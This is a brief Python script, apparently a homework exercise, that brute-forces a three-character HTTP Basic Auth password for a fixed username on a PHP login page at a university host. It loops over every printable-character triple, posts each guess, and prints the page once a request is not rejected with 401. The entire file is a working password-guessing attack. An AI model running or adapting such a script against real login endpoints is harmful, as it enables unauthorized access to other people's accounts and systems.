import requests
from requests.auth import HTTPBasicAuth
import string

Usr = "108321019"
Url = "http://ms15.voip.edu.tw/~solomon/PHP/hw09_4_login.php"
allChar = string.printable
for i in allChar:
    for j in allChar:
        for k in allChar:
            auth = HTTPBasicAuth(Usr, i + j + k)
            r = requests.post(url=Url, auth=auth)
            if r.status_code != 401:
                print(r.text)
                quit()
